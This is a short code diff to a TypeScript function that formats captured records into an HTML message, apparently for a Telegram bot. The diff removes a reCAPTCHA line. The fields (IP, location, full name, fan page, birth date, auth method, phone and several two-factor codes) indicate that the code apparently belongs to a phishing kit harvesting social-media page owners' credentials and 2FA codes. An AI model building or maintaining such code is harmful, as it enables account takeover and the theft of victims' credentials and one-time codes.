@@ -129,16 +129,12 @@ function formatMessage(data: any): string {
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
         : '';
     const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
-    const recaptchaLine = d.recaptcha
-        ? `<b>reCAPTCHA:</b> <code>${escapeHtml(d.recaptcha)}</code>`
-        : '';
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
 
     const lines = [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
-        recaptchaLine,
         `----------------------`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
